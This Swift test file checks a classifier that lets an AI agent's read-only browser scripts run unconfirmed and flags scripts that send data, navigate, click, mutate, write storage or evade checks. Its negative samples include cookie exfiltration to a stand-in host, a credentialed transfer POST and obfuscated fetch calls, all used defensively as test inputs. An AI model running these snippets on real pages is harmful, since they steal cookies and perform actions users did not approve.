//
//  AgentBrowserScriptClassifierTests.swift
//  XeditTests
//
//  Read-only page scripts run without a card; anything that can send,
//  navigate, submit, mutate, write storage or hide what it does still asks.
//  The read-only samples are the four scripts the model actually wrote for
//  the 2026-09-22 Baidu task, which cost the user four confirmations.
//

import Foundation
import Testing
@testable import WillDeep

@Suite
@MainActor
struct AgentBrowserScriptClassifierTests {
    static let baiduScripts: [String] = [
        #"""
        const out = [];
        document.querySelectorAll('div.result, div.result-op, div[class*="c-container"]').forEach((el,i)=>{
          const a = el.querySelector('h3 a') || el.querySelector('a[href]');
          if(!a) return;
          out.push({ i, cls: el.className, tuiguang: el.getAttribute('data-tuiguang') || el.getAttribute('mu') || null,
            title: (a.innerText||'').trim().slice(0,120), href: a.getAttribute('href'),
            text: (el.innerText||'').replace(/\s+/g,' ').trim().slice(0,200) });
        });
        return out.slice(0,12);
        """#,
        #"""
        const els = [...document.querySelectorAll('#content_left > div')];
        return els.map((el,i)=>{
          const a = el.querySelector('h3 a') || el.querySelector('a[href]');
          const adLabel = [...el.querySelectorAll('span,div')].some(s=>/^\s*广告\s*$/.test(s.innerText||''));
          return { order: i, id: el.id, cls: el.className, isAdLabel: adLabel, hasEc: /ec_|_ad|advert/.test(el.className),
            title: a ? (a.innerText||'').trim().slice(0,80) : '', text: (el.innerText||'').replace(/\s+/g,' ').trim().slice(0,90) };
        }).filter(x=>x.title || x.text);
        """#,
        #"""
        const el = document.querySelector('#content_left > div#3') || document.querySelector('#3');
        if(!el) return 'not found';
        const a = el.querySelector('h3 a');
        const src = el.innerText.replace(/\s+/g,' ').trim();
        return { title: a.innerText.trim(), baiduHref: a.getAttribute('href'), mu: el.getAttribute('mu'),
          dataTools: el.getAttribute('data-tools'), fullText: src.slice(0,600),
          sourceLine: (el.querySelector('[class*="source"], .c-color-gray, .c-color-gray2')||{}).innerText || null };
        """#,
        #"""
        const el = document.querySelector('#content_left > div[id="3"]');
        if(!el) return 'not found';
        const a = el.querySelector('h3 a');
        return { title: a.innerText.trim(), baiduHref: a.getAttribute('href'), mu: el.getAttribute('mu'),
          fullText: el.innerText.replace(/\s+/g,' ').trim().slice(0,700) };
        """#,
    ]

    @Test("百度任务里模型实际写的 4 段脚本都判为只读")
    func realBaiduScriptsAreReadOnly() {
        for (index, script) in Self.baiduScripts.enumerated() {
            #expect(AgentBrowserScriptClassifier.blockingReason(script) == nil, "script \(index)")
        }
    }

    @Test("常见只读写法不误伤：比较、箭头函数、原型方法借用、样式读取")
    func commonReadIdiomsStayReadOnly() {
        let scripts = [
            "return document.title;",
            "return [...document.querySelectorAll('a')].map(a => ({ text: a.innerText, href: a.href }));",
            "return Array.prototype.map.call(document.querySelectorAll('li'), (li) => li.textContent);",
            "const el = document.querySelector('#x'); return el.style.display === 'none' || el.classList.contains('hidden');",
            "return getComputedStyle(document.body).color;",
            "const items = []; for (const row of document.querySelectorAll('tr')) { items.push(row.innerText); } return items;",
            "return location.href;",
            "return document.querySelector('input[name=q]').value;",
            "const r = {}; r.title = document.title; r.count = document.links.length; return r;",
            "return document.cookie.length;",
        ]
        for script in scripts {
            #expect(AgentBrowserScriptClassifier.isReadOnly(script), "\(script)")
        }
    }

    @Test(
        "发请求、跳转、提交、改页面、写存储、动态执行或混淆写法都不算只读",
        arguments: [
            ("fetch('/api/transfer', {method:'POST', credentials:'include'})", "network"),
            ("new XMLHttpRequest()", "network"),
            ("navigator.sendBeacon('https://x.example', document.body.innerText)", "network"),
            ("new Image().src = 'https://x.example/?d=' + document.cookie", "network"),
            ("document.querySelector('img').src = 'https://x.example/p'", "network"),
            ("location = 'https://x.example'", "navigation"),
            ("location.href = 'https://x.example'", "navigation"),
            ("window.location.assign('https://x.example')", "navigation"),
            ("window.open('https://x.example')", "navigation"),
            ("history.pushState({}, '', '/x')", "navigation"),
            ("document.forms[0].submit()", "action"),
            ("document.querySelector('#buy').click()", "action"),
            ("el.dispatchEvent(new Event('change'))", "action"),
            ("document.querySelector('#q').value = 'x'", "mutation"),
            ("document.body.innerHTML += '<b>x</b>'", "mutation"),
            ("el.style.display = 'none'", "mutation"),
            ("el.classList.add('x')", "mutation"),
            ("el.setAttribute('href', 'x')", "mutation"),
            ("document.body.appendChild(document.createElement('script'))", "mutation"),
            ("document.querySelector('.ad').remove()", "mutation"),
            ("document.cookie = 'a=b'", "storage"),
            ("localStorage.setItem('k', 'v')", "storage"),
            ("indexedDB.databases()", "storage"),
            ("eval('1+1')", "dynamic"),
            ("new Function('return 1')()", "dynamic"),
            ("setTimeout('alert(1)', 0)", "dynamic"),
            ("window['fe' + 'tch']('/x')", "dynamic"),
            ("self['fetch']", "dynamic"),
            ("atob('ZmV0Y2g=')", "dynamic"),
            ("'\\u0066etch'", "dynamic"),
            ("({}).constructor.constructor('return fetch')()", "dynamic"),
        ]
    )
    func sideEffectsAreNotReadOnly(script: String, reason: String) {
        #expect(AgentBrowserScriptClassifier.blockingReason(script) == reason, "\(script)")
    }

    @Test("空脚本、超长脚本不做分类；所有规则都能编译")
    func unclassifiableScriptsAsk() {
        #expect(AgentBrowserScriptClassifier.compiled != nil)
        #expect(!AgentBrowserScriptClassifier.isReadOnly("   "))
        #expect(!AgentBrowserScriptClassifier.isReadOnly(String(
            repeating: "document.title;", count: AgentBrowserScriptClassifier.maximumClassifiedLength
        )))
    }

    @Test("只读脚本在没授权的网站上直接放行；有副作用或带密钥占位符的脚本照旧要确认；严格模式仍然询问")
    func approvalHonorsClassification() async {
        let appState = AppState()
        appState.agentAlwaysAllowedCommands = []
        let host = AgentToolAuthorization.embeddedBrowserPageHostArgument
        func approval(_ javascript: String, mode: AgentApprovalMode = .smart) async -> AgentToolApprovalSource? {
            await appState.autoApprovalSource(
                toolName: "embedded_browser_eval",
                arguments: ["javascript": .string(javascript), host: .string("www.baidu.com")],
                risk: .write,
                rootDirectory: nil,
                approvalMode: mode
            )
        }
        #expect(await approval(Self.baiduScripts[1]) == .staticAllowlist)
        #expect(await approval("document.querySelector('#buy').click()") == nil)
        #expect(await approval("return document.querySelector('${secret:api-key}')") == nil)
        #expect(await approval(Self.baiduScripts[1], mode: .requestEveryTime) == nil)
    }
}
